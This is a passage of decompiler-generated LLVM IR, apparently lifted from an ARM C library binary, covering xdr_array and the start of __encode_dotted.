  %v1_342fc = phi i32 [ %v1_342fc.pre, %dec_label_pc_342dc.dec_label_pc_342ec_crit_edge ], [ %arg4, %entry ]
  %v0_342f4 = phi i32 [ %v0_342f4.pre, %dec_label_pc_342dc.dec_label_pc_342ec_crit_edge ], [ %arg1, %entry ]
  %v0_342f0 = phi i32 [ %v0_342f0.pre, %dec_label_pc_342dc.dec_label_pc_342ec_crit_edge ], [ %arg2, %entry ]
  %v1_342ec = phi i32 [ %v1_342ec.pre, %dec_label_pc_342dc.dec_label_pc_342ec_crit_edge ], [ %arg3, %entry ]
  %v0_34300 = phi i32 [ %v0_342ec.pre, %dec_label_pc_342dc.dec_label_pc_342ec_crit_edge ], [ 0, %entry ]
  %v3_342ec = icmp ult i32 %v0_34300, %v1_342ec
  store i32 %v0_342f4, i32* %r0.global-to-local, align 4
  %v2_342fc = add i32 %v0_342f0, %v1_342fc
  store i32 %v2_342fc, i32* %r4.global-to-local, align 4
  %v1_34300 = add i32 %v0_34300, 1
  store i32 %v1_34300, i32* %r5.global-to-local, align 4
  br i1 %v3_342ec, label %dec_label_pc_342dc, label %dec_label_pc_34308

dec_label_pc_34308:                               ; preds = %dec_label_pc_342ec
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3430c

dec_label_pc_3430c:                               ; preds = %dec_label_pc_342dc, %dec_label_pc_34308
  %v1_34314 = phi i32 [ 1, %dec_label_pc_34308 ], [ 0, %dec_label_pc_342dc ]
  ret i32 %v1_34314

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_3430c, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v9_34318 = load i32, i32* @r6, align 4
  %v12_34318 = load i32, i32* @r7, align 4
  %v15_34318 = load i32, i32* @r8, align 4
  %v18_34318 = load i32, i32* @sb, align 4
  %v21_34318 = load i32, i32* @sl, align 4
  %v24_34318 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @r1, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg5, i32* @fp, align 4
  %v1_34338 = inttoptr i32 %arg2 to i32*
  %v2_34338 = load i32, i32* %v1_34338, align 4
  store i32 %v2_34338, i32* @r5, align 4
  %v2_3433c = inttoptr i32 %arg3 to i32*
  %v4_3433c = call i32 @xdr_u_int(i32* %v2_3433c, i32* %v2_3433c)
  store i32 %v4_3433c, i32* %r0.global-to-local, align 4
  %v2_34344 = icmp eq i32 %v4_3433c, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v2_34344, label %dec_label_pc_3444c, label %dec_label_pc_34350

dec_label_pc_34350:                               ; preds = %entry
  %v0_34350 = load i32, i32* @r4, align 4
  %v1_34350 = inttoptr i32 %v0_34350 to i32*
  %v2_34350 = load i32, i32* %v1_34350, align 4
  store i32 %v2_34350, i32* @r7, align 4
  %v1_34354 = load i32, i32* @r8, align 4
  %tmp22 = icmp ugt i32 %v2_34350, %v1_34354
  br i1 %tmp22, label %dec_label_pc_34370, label %dec_label_pc_3435c

dec_label_pc_3435c:                               ; preds = %dec_label_pc_34350
  %v0_34360 = load i32, i32* @fp, align 4
  %v2_34364 = udiv i32 -1, %v0_34360
  store i32 %v2_34364, i32* %r0.global-to-local, align 4
  %tmp23 = icmp ugt i32 %v2_34350, %v2_34364
  br i1 %tmp23, label %dec_label_pc_34370, label %dec_label_pc_3437c

dec_label_pc_34370:                               ; preds = %dec_label_pc_3435c, %dec_label_pc_34350
  %v0_34370 = load i32, i32* @sl, align 4
  %v1_34370 = inttoptr i32 %v0_34370 to i32*
  %v2_34370 = load i32, i32* %v1_34370, align 4
  %v7_34374 = icmp eq i32 %v2_34370, 2
  br i1 %v7_34374, label %dec_label_pc_3437c, label %dec_label_pc_3444c

dec_label_pc_3437c:                               ; preds = %dec_label_pc_3435c, %dec_label_pc_34370
  %v0_3437c = load i32, i32* @r5, align 4
  %v2_3437c = icmp eq i32 %v0_3437c, 0
  br i1 %v2_3437c, label %dec_label_pc_34384, label %dec_label_pc_343ec

dec_label_pc_34384:                               ; preds = %dec_label_pc_3437c
  %v0_34384 = load i32, i32* @sl, align 4
  %v1_34384 = inttoptr i32 %v0_34384 to i32*
  %v2_34384 = load i32, i32* %v1_34384, align 4
  %v7_34388 = icmp eq i32 %v2_34384, 1
  br i1 %v7_34388, label %dec_label_pc_3439c, label %dec_label_pc_34390

dec_label_pc_34390:                               ; preds = %dec_label_pc_34384
  %v7_34390 = icmp eq i32 %v2_34384, 2
  br i1 %v7_34390, label %dec_label_pc_34454, label %dec_label_pc_343ec

dec_label_pc_3439c:                               ; preds = %dec_label_pc_34384
  %v2_3439c = icmp eq i32 %v2_34350, 0
  br i1 %v2_3439c, label %dec_label_pc_34454, label %dec_label_pc_343a4

dec_label_pc_343a4:                               ; preds = %dec_label_pc_3439c
  %v1_343a4 = load i32, i32* @fp, align 4
  %v2_343a4 = mul i32 %v1_343a4, %v2_34350
  store i32 %v2_343a4, i32* @r4, align 4
  store i32 %v2_343a4, i32* %r0.global-to-local, align 4
  %v1_343ac = call i32 @malloc(i32 %v2_343a4)
  store i32 %v1_343ac, i32* @r0, align 4
  %v2_343b0 = icmp eq i32 %v1_343ac, 0
  store i32 %v1_343ac, i32* @r5, align 4
  %v1_343b8 = load i32, i32* @sb, align 4
  %v2_343b8 = inttoptr i32 %v1_343b8 to i32*
  store i32 %v1_343ac, i32* %v2_343b8, align 4
  br i1 %v2_343b0, label %dec_label_pc_343c0, label %dec_label_pc_343e0

dec_label_pc_343c0:                               ; preds = %dec_label_pc_343a4
  store i32 -33000, i32* %r0.global-to-local, align 4
  %v0_343c8 = load i32, i32* @r6, align 4
  %v2_343c8 = add i32 %v0_343c8, 196
  %v3_343c8 = inttoptr i32 %v2_343c8 to i32*
  %v4_343c8 = load i32, i32* %v3_343c8, align 4
  %v2_343cc = add i32 %v0_343c8, -33000
  store i32 %v2_343cc, i32* %r0.global-to-local, align 4
  %v1_343d0 = inttoptr i32 %v4_343c8 to i32*
  %v2_343d0 = load i32, i32* %v1_343d0, align 4
  %v2_343d4 = call i32 @__GI_fputs(i32 %v2_343cc, i32 %v2_343d0)
  store i32 %v2_343d4, i32* %r0.global-to-local, align 4
  %v0_343d8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_34458

dec_label_pc_343e0:                               ; preds = %dec_label_pc_343a4
  %v0_343e0 = load i32, i32* @r4, align 4
  store i32 %v0_343e0, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  %v0_343e8 = call i32 @__GI_memset()
  store i32 %v0_343e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_343ec

dec_label_pc_343ec:                               ; preds = %dec_label_pc_34390, %dec_label_pc_3437c, %dec_label_pc_343e0
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_34408

dec_label_pc_343f8:                               ; preds = %bb21
  %v0_34428 = load i32, i32* %r6.global-to-local, align 4
  %v1_34428 = add i32 %v0_34428, 1
  store i32 %v1_34428, i32* %r6.global-to-local, align 4
  store i32 214020, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg6)
  %v0_34404 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_34408

dec_label_pc_34408:                               ; preds = %dec_label_pc_343ec, %dec_label_pc_343f8
  %storemerge = phi i32 [ 1, %dec_label_pc_343ec ], [ %v0_34404, %dec_label_pc_343f8 ]
  store i32 %storemerge, i32* @r4, align 4
  %v2_34408 = icmp eq i32 %storemerge, 0
  br i1 %v2_34408, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_34408
  %v1_3440c = load i32, i32* %r6.global-to-local, align 4
  %v2_3440c = load i32, i32* @r7, align 4
  %v4_3440c = icmp uge i32 %v1_3440c, %v2_3440c
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_34408, %bb
  %v0_34424.pr = phi i1 [ true, %dec_label_pc_34408 ], [ %v4_3440c, %bb ]
  %v0_34410 = load i32, i32* @r5, align 4
  %v0_34414 = load i32, i32* @sl, align 4
  store i32 %v0_34414, i32* %r0.global-to-local, align 4
  %v1_3441c = load i32, i32* @fp, align 4
  %v2_3441c = add i32 %v1_3441c, %v0_34410
  store i32 %v2_3441c, i32* @r5, align 4
  br i1 %v0_34424.pr, label %dec_label_pc_34430, label %dec_label_pc_343f8

dec_label_pc_34430:                               ; preds = %bb21
  store i32 0, i32* @r8, align 4
  %v0_344282 = load i32, i32* %r6.global-to-local, align 4
  %v1_344283 = add i32 %v0_344282, 1
  store i32 %v1_344283, i32* @r6, align 4
  %v1_34430 = inttoptr i32 %v0_34414 to i32*
  %v2_34430 = load i32, i32* %v1_34430, align 4
  %v7_34434 = icmp eq i32 %v2_34430, 2
  br i1 %v7_34434, label %dec_label_pc_3443c, label %dec_label_pc_34458

dec_label_pc_3443c:                               ; preds = %dec_label_pc_34430
  %v0_3443c = load i32, i32* @sb, align 4
  %v1_3443c = inttoptr i32 %v0_3443c to i32*
  %v2_3443c = load i32, i32* %v1_3443c, align 4
  store i32 %v2_3443c, i32* @r0, align 4
  %v0_34440 = call i32 @free()
  store i32 %v0_34440, i32* %r0.global-to-local, align 4
  %v0_34444 = load i32, i32* @r8, align 4
  %v1_34444 = load i32, i32* @sb, align 4
  %v2_34444 = inttoptr i32 %v1_34444 to i32*
  store i32 %v0_34444, i32* %v2_34444, align 4
  %v0_34458.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_34458

dec_label_pc_3444c:                               ; preds = %dec_label_pc_34370, %entry
  br label %dec_label_pc_34458

dec_label_pc_34454:                               ; preds = %dec_label_pc_34390, %dec_label_pc_3439c
  br label %dec_label_pc_34458

dec_label_pc_34458:                               ; preds = %dec_label_pc_34430, %dec_label_pc_3444c, %dec_label_pc_3443c, %dec_label_pc_343c0, %dec_label_pc_34454
  %v0_34458 = phi i32 [ %storemerge, %dec_label_pc_34430 ], [ 0, %dec_label_pc_3444c ], [ %v0_34458.pre, %dec_label_pc_3443c ], [ %v0_343d8, %dec_label_pc_343c0 ], [ 1, %dec_label_pc_34454 ]
  store i32 %v0_34458, i32* %r0.global-to-local, align 4
  store i32 %v9_34318, i32* %r6.global-to-local, align 4
  store i32 %v12_34318, i32* @r7, align 4
  store i32 %v15_34318, i32* @r8, align 4
  store i32 %v18_34318, i32* @sb, align 4
  store i32 %v21_34318, i32* @sl, align 4
  store i32 %v24_34318, i32* @fp, align 4
  ret i32 %v0_34458

; uselistorder directives
  uselistorder i32 %v0_34458, { 1, 0 }
  uselistorder i32 %v1_343ac, { 1, 0, 2, 3 }
  uselistorder i32 %v2_34350, { 2, 3, 0, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 2, 1, 4, 7, 5, 6, 8, 10, 9 }
  uselistorder i32 ()* @free, { 63, 66, 65, 64, 11, 12, 62, 61, 34, 33, 32, 31, 30, 29, 24, 23, 22, 21, 20, 60, 59, 58, 57, 3, 2, 35, 56, 55, 54, 10, 9, 8, 7, 6, 5, 4, 28, 27, 26, 25, 0, 19, 18, 17, 16, 53, 52, 51, 50, 37, 15, 41, 40, 42, 47, 1, 39, 38, 14, 49, 48, 46, 45, 44, 43, 36, 13 }
  uselistorder i32 ()* @__GI_memset, { 100, 7, 18, 99, 98, 17, 16, 15, 6, 9, 8, 1, 2, 0, 14, 97, 96, 13, 38, 104, 103, 102, 101, 12, 109, 5, 41, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 108, 107, 65, 64, 63, 62, 106, 105, 61, 60, 59, 58, 57, 56, 55, 54, 22, 21, 20, 19, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 40, 39, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 4, 3, 23, 11, 10 }
  uselistorder i32 (i32, i32)* @__GI_fputs, { 7, 3, 6, 5, 0, 1, 4, 2 }
  uselistorder i32 196, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32)* @malloc, { 50, 44, 4, 3, 6, 49, 18, 17, 12, 11, 48, 47, 46, 45, 43, 5, 42, 16, 15, 14, 0, 1, 51, 13, 10, 9, 35, 36, 39, 27, 41, 40, 38, 37, 34, 33, 19, 20, 32, 31, 30, 29, 28, 26, 25, 24, 23, 22, 21, 2, 8, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_44990.1184 to i32), { 190, 191, 129, 130, 192, 193, 194, 195, 131, 196, 132, 197, 198, 199, 200, 201, 202, 12, 10, 11, 134, 13, 203, 135, 67, 5, 136, 204, 205, 206, 207, 15, 14, 208, 209, 210, 137, 138, 211, 212, 16, 213, 139, 140, 214, 17, 18, 141, 215, 3, 216, 217, 218, 219, 220, 142, 221, 222, 223, 143, 224, 19, 144, 225, 20, 145, 226, 227, 68, 228, 25, 27, 22, 23, 26, 21, 24, 229, 28, 146, 230, 231, 232, 29, 147, 233, 234, 30, 31, 32, 33, 149, 235, 34, 148, 150, 236, 35, 36, 237, 37, 238, 38, 239, 39, 240, 151, 152, 241, 153, 242, 40, 41, 243, 154, 244, 245, 246, 247, 248, 249, 88, 87, 89, 250, 251, 113, 109, 107, 106, 108, 110, 111, 112, 105, 114, 100, 102, 101, 99, 98, 103, 104, 95, 94, 97, 96, 93, 92, 91, 90, 156, 115, 116, 117, 157, 252, 6, 159, 158, 73, 118, 74, 119, 42, 120, 253, 160, 43, 254, 255, 256, 44, 45, 257, 46, 258, 47, 161, 259, 260, 261, 262, 263, 264, 48, 265, 164, 163, 80, 77, 78, 79, 76, 49, 121, 75, 266, 162, 165, 267, 166, 268, 50, 269, 270, 122, 123, 85, 124, 82, 81, 83, 84, 125, 155, 126, 127, 168, 271, 51, 133, 52, 53, 272, 86, 273, 169, 274, 0, 170, 275, 167, 171, 276, 277, 172, 278, 54, 279, 280, 281, 173, 1, 2, 174, 4, 175, 282, 283, 284, 55, 56, 285, 286, 69, 287, 70, 288, 289, 57, 58, 290, 291, 176, 292, 293, 294, 295, 296, 297, 128, 298, 178, 179, 180, 299, 181, 300, 59, 301, 302, 8, 7, 60, 185, 182, 303, 304, 71, 305, 72, 61, 177, 306, 307, 183, 184, 308, 309, 310, 186, 311, 62, 312, 63, 187, 313, 314, 64, 188, 9, 65, 66, 189 }
  uselistorder i32 (i32*, i32*)* @xdr_u_int, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @fp, { 8, 9, 10, 11, 12, 13, 243, 244, 245, 246, 173, 174, 175, 176, 185, 186, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 271, 272, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 0, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 177, 178, 179, 180, 181, 182, 183, 184, 277, 2, 197, 198, 199, 200, 273, 275, 274, 276, 211, 212, 213, 1, 214, 215, 216, 217, 26, 27, 28, 29, 90, 91, 30, 31, 32, 33, 3, 4, 5, 6, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 218, 219, 220, 221, 222, 223, 224, 225, 226, 37, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 119, 120, 118, 113, 114, 115, 116, 117, 121, 122, 123, 150, 151, 152, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 7 }
  uselistorder i32* @sl, { 23, 24, 25, 26, 27, 28, 151, 152, 153, 29, 30, 96, 97, 98, 99, 105, 106, 156, 157, 158, 159, 160, 161, 1, 162, 154, 155, 51, 163, 164, 165, 166, 181, 182, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 123, 124, 125, 126, 127, 0, 128, 3, 129, 130, 131, 132, 133, 134, 135, 136, 137, 31, 4, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 100, 101, 102, 103, 104, 8, 9, 200, 56, 57, 117, 118, 119, 120, 121, 122, 183, 184, 185, 5, 186, 187, 188, 189, 190, 191, 193, 6, 192, 195, 194, 196, 197, 198, 199, 138, 139, 140, 141, 142, 143, 144, 145, 146, 58, 59, 60, 61, 62, 63, 64, 65, 89, 90, 91, 92, 66, 67, 68, 69, 10, 11, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 167, 168, 169, 170, 171, 172, 173, 7, 174, 175, 176, 177, 178, 179, 180, 147, 148, 149, 150, 81, 201, 202, 203, 204, 205, 70, 71, 72, 73, 74, 75, 76, 93, 94, 95, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 22 }
  uselistorder i32* @sb, { 16, 17, 18, 19, 20, 21, 139, 140, 141, 22, 23, 67, 68, 69, 70, 75, 76, 77, 78, 142, 143, 144, 145, 146, 38, 147, 156, 157, 158, 79, 80, 81, 82, 95, 83, 84, 85, 3, 86, 96, 97, 4, 98, 99, 100, 101, 102, 103, 104, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 71, 72, 73, 74, 6, 87, 88, 89, 90, 91, 92, 93, 94, 159, 162, 160, 161, 163, 105, 106, 107, 108, 109, 110, 111, 39, 40, 41, 42, 43, 44, 61, 62, 45, 46, 47, 48, 49, 7, 0, 8, 9, 10, 11, 12, 13, 14, 148, 149, 150, 151, 152, 153, 154, 1, 155, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 2, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 54, 50, 51, 63, 64, 65, 66, 52, 53, 5, 57, 55, 56, 58, 59, 60, 15 }
  uselistorder i32* @r8, { 47, 48, 49, 50, 51, 52, 211, 212, 213, 53, 6, 54, 55, 56, 57, 153, 154, 155, 156, 157, 158, 163, 164, 87, 7, 88, 89, 90, 91, 23, 24, 25, 219, 220, 221, 225, 226, 214, 215, 216, 217, 218, 58, 59, 60, 61, 92, 227, 247, 248, 228, 229, 230, 245, 246, 16, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 182, 183, 184, 185, 186, 187, 188, 8, 189, 190, 191, 192, 193, 194, 62, 66, 63, 64, 65, 67, 68, 2, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 93, 94, 95, 96, 159, 160, 161, 162, 97, 98, 99, 17, 26, 27, 9, 28, 177, 178, 10, 179, 180, 181, 249, 250, 251, 252, 253, 15, 254, 255, 256, 257, 258, 259, 260, 261, 195, 196, 197, 198, 199, 200, 201, 202, 203, 100, 101, 102, 103, 104, 105, 106, 136, 137, 107, 108, 109, 110, 111, 147, 148, 149, 150, 151, 152, 29, 30, 31, 11, 32, 12, 33, 34, 35, 36, 37, 38, 39, 40, 41, 13, 42, 43, 204, 205, 222, 223, 0, 224, 231, 232, 233, 234, 235, 236, 5, 237, 1, 238, 239, 240, 44, 45, 241, 242, 243, 244, 18, 131, 132, 133, 134, 135, 206, 207, 124, 112, 113, 262, 14, 3, 114, 263, 264, 265, 115, 116, 118, 117, 119, 19, 142, 145, 146, 143, 144, 120, 121, 122, 4, 123, 125, 126, 127, 128, 208, 209, 210, 20, 21, 129, 130, 22, 138, 139, 140, 141, 46 }
  uselistorder i32* @r7, { 73, 74, 75, 76, 77, 78, 79, 80, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 351, 352, 481, 135, 136, 137, 138, 139, 81, 9, 82, 83, 84, 85, 38, 482, 485, 486, 487, 488, 10, 40, 41, 42, 489, 490, 491, 492, 34, 496, 5, 497, 475, 476, 477, 478, 86, 87, 88, 89, 140, 539, 498, 535, 538, 501, 11, 502, 503, 504, 147, 148, 149, 150, 151, 152, 153, 154, 299, 300, 12, 90, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 388, 389, 390, 391, 392, 398, 399, 400, 401, 402, 403, 406, 408, 409, 410, 411, 412, 413, 93, 91, 92, 13, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 141, 142, 143, 540, 541, 542, 543, 144, 145, 33, 146, 505, 1, 506, 511, 512, 513, 507, 14, 508, 509, 510, 344, 15, 345, 346, 347, 348, 349, 350, 155, 156, 161, 162, 163, 164, 157, 158, 159, 160, 165, 166, 167, 168, 169, 325, 283, 284, 326, 327, 555, 556, 557, 558, 612, 613, 16, 43, 44, 170, 171, 7, 172, 39, 173, 174, 565, 566, 573, 574, 575, 576, 577, 578, 579, 569, 570, 571, 572, 382, 383, 384, 385, 386, 387, 544, 545, 546, 547, 548, 549, 550, 551, 17, 552, 553, 554, 536, 537, 175, 407, 176, 451, 452, 453, 454, 414, 415, 483, 484, 455, 456, 416, 417, 418, 419, 420, 431, 432, 433, 434, 435, 436, 437, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 288, 18, 289, 290, 187, 188, 189, 190, 191, 2, 192, 6, 193, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 316, 317, 318, 319, 320, 20, 19, 321, 322, 323, 324, 45, 21, 46, 47, 22, 48, 23, 49, 50, 51, 52, 53, 54, 55, 56, 57, 24, 58, 59, 514, 515, 516, 517, 518, 519, 520, 521, 522, 25, 393, 394, 438, 26, 439, 440, 441, 35, 442, 493, 27, 494, 495, 443, 444, 445, 446, 447, 395, 28, 396, 397, 523, 524, 525, 530, 531, 60, 61, 526, 527, 528, 529, 532, 533, 0, 534, 285, 286, 287, 471, 472, 473, 474, 277, 278, 279, 280, 448, 449, 450, 499, 500, 610, 611, 559, 560, 194, 580, 581, 567, 568, 264, 265, 268, 269, 582, 583, 479, 480, 584, 585, 224, 353, 354, 301, 281, 282, 586, 587, 195, 29, 204, 205, 461, 462, 302, 303, 588, 589, 225, 226, 270, 271, 272, 273, 274, 275, 276, 227, 228, 196, 197, 198, 199, 304, 305, 200, 201, 404, 405, 202, 266, 267, 249, 30, 203, 590, 591, 592, 3, 594, 593, 595, 596, 206, 207, 4, 208, 209, 210, 597, 598, 599, 605, 606, 211, 212, 213, 214, 215, 216, 217, 218, 219, 36, 220, 221, 222, 223, 229, 230, 231, 232, 306, 314, 315, 307, 308, 309, 313, 310, 311, 312, 463, 464, 465, 466, 467, 233, 234, 235, 236, 600, 601, 602, 603, 604, 250, 251, 252, 253, 62, 63, 64, 65, 457, 458, 459, 460, 66, 67, 295, 296, 297, 298, 328, 329, 330, 331, 68, 69, 70, 71, 237, 238, 239, 240, 241, 242, 243, 244, 245, 8, 246, 607, 37, 608, 609, 31, 247, 248, 561, 562, 563, 564, 254, 255, 256, 257, 468, 469, 470, 258, 259, 260, 261, 262, 32, 263, 291, 292, 293, 294, 72 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_34458, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_34454, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_34408, { 1, 0 }
  uselistorder label %dec_label_pc_343ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_3437c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_34474 = load i32, i32* @r4, align 4
  store i32 %v3_34474, i32* %stack_var_-32, align 4
  %v6_34474 = load i32, i32* @r5, align 4
  %v9_34474 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_3447c = load i32, i32* @r1, align 4
  store i32 %v0_3447c, i32* %r8.global-to-local, align 4
  %v0_34480 = load i32, i32* @r2, align 4
  store i32 %v0_34480, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_344e823 = icmp slt i8* %arg1, null
  store i1 %v1_344e823, i1* %cpsr_n.global-to-local, align 1
  %v2_344e824 = icmp eq i8* %arg1, null
  store i1 %v2_344e824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_344e824, label %dec_label_pc_34500, label %dec_label_pc_344f4

dec_label_pc_3448c:                               ; preds = %dec_label_pc_344f4
  %v2_3448c = call i32 @__GI_strchr(i32 %v0_3448c26, i32 46)
  store i32 %v2_3448c, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_34490 = icmp slt i32 %v2_3448c, 0
  store i1 %v1_34490, i1* %cpsr_n.global-to-local, align 1
  %v2_34490 = icmp eq i32 %v2_3448c, 0
  store i1 %v2_34490, i1* %cpsr_z.global-to-local, align 1
  %v0_34494 = load i32, i32* @r4, align 4
  %v2_34494 = sub i32 %v2_3448c, %v0_34494
  store i32 %v2_34494, i32* @r5, align 4
  br i1 %v2_34490, label %dec_label_pc_3449c, label %dec_label_pc_344a8

dec_label_pc_3449c:                               ; preds = %dec_label_pc_3448c
  %v1_3449c = inttoptr i32 %v0_34494 to i8*
  %v3_344a0 = call i32 @strlen(i8* %v1_3449c)
  %sext = mul i32 %v3_344a0, 16777216
  %v1_344a4 = sdiv i32 %sext, 16777216
  store i32 %v1_344a4, i32* @r5, align 4
  %v0_344b4.pre = load i32, i32* @r4, align 4
  %v0_344c4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_344a8

dec_label_pc_344a8:                               ; preds = %dec_label_pc_3448c, %dec_label_pc_3449c
  %v0_344c4 = phi i32 [ %v2_3448c, %dec_label_pc_3448c ], [ %v0_344c4.pre, %dec_label_pc_3449c ]
  %v0_344b4 = phi i32 [ %v0_34494, %dec_label_pc_3448c ], [ %v0_344b4.pre, %dec_label_pc_3449c ]
  %v0_344d4 = phi i32 [ %v2_34494, %dec_label_pc_3448c ], [ %v1_344a4, %dec_label_pc_3449c ]
  %v0_344a8 = load i32, i32* %sl.global-to-local, align 4
  %v1_344a8 = add i32 %v0_344a8, 1
  store i32 %v1_344a8, i32* %r7.global-to-local, align 4
  %v1_344ac = load i32, i32* %sb.global-to-local, align 4
  %v2_344ac = sub i32 %v1_344ac, %v0_344a8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_344b0 = icmp slt i32 %v0_344d4, 0
  store i1 %v1_344b0, i1* %cpsr_n.global-to-local, align 1
  %v2_344b0 = icmp eq i32 %v0_344d4, 0
  store i1 %v2_344b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_344b4, i32* @r1, align 4
  %v0_344b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_344b8 = add i32 %v0_344b8, %v1_344a8
  store i32 %v2_344b8, i32* @r0, align 4
  store i32 %v0_344d4, i32* @r2, align 4
  %v1_344c0 = add i32 %v2_344ac, -1
  store i32 %v1_344c0, i32* @r3, align 4
  %v1_344c4 = add i32 %v0_344c4, 1
  store i32 %v1_344c4, i32* @r4, align 4
  br i1 %v2_344b0, label %dec_label_pc_34514, label %dec_label_pc_344cc

dec_label_pc_344cc:                               ; preds = %dec_label_pc_344a8
  %v2_344cc = sub i32 %v0_344d4, %v1_344c0
  %v3_344cc = icmp ult i32 %v0_344d4, %v1_344c0
  %v4_344cc = xor i32 %v1_344c0, %v0_344d4
  %v5_344cc = xor i32 %v2_344cc, %v0_344d4
  %v6_344cc = and i32 %v5_344cc, %v4_344cc
  %v7_344cc = icmp slt i32 %v6_344cc, 0
  store i1 %v7_344cc, i1* %cpsr_v.global-to-local, align 1
  %v8_344cc = icmp slt i32 %v2_344cc, 0
  store i1 %v8_344cc, i1* %cpsr_n.global-to-local, align 1
  %v9_344cc = icmp eq i32 %v0_344d4, %v1_344c0
  store i1 %v9_344cc, i1* %cpsr_z.global-to-local, align 1
